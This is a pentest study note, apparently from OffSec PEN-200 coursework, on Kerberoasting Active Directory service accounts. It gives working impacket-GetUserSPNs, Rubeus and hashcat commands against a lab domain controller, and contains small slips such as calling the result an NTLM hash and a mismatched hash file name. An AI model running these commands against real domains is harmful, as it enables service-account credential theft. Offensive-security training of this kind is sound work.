
## DESCRIPTION

Let's recall how the Kerberos protocol works. We know that when a user wants to access a resource hosted by a Service Principal Name (SPN), the client requests a service ticket that is generated by the domain controller. The service ticket is then decrypted and validated by the application server, since it is encrypted via the password hash of the SPN.

When requesting the service ticket from the domain controller, no checks are performed to confirm whether the user has any permissions to access the service hosted by the SPN.

These checks are performed as a second step only when connecting to the service itself. This means that if we know the SPN we want to target, we can request a service ticket for it from the domain controller.

The service ticket is encrypted using the SPN's password hash. If we are able to request the ticket and decrypt it using brute force or guessing, we can use this information to crack the cleartext password of the service account. This technique is known as _Kerberoasting_.[1](https://portal.offsec.com/courses/pen-200-2023/books-and-videos/modal/modules/attacking-active-directory-authentication/performing-attacks-on-active-directory-authentication/kerberoasting#fn1)

What's we need? →  TGS (user and password)
What's we obtain? → USER hash NTLM 

#### Mas información
* 


## EXPLOITATION

### OPTION 1: 

```
impacket-GetUserSPNs <<domain name>>/<<username>>:<<password>> -outputfile <<krbroast>>


sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```

**!!NOTA IMPORTANTE!!** SI NOS DA ESTE ERROR --> TENEMOS QUE SINCRONIZARNOS

![[Pasted image 20230525200042.png]]

```
 ntpdate <IP of DC>
```

### OPTION 2: 

```
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

2. Cracking

```
sudo hashcat -m 13100  hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
## MACHINES

* Hack The Box: 

**!!NOTA IMPORTANTE!!** 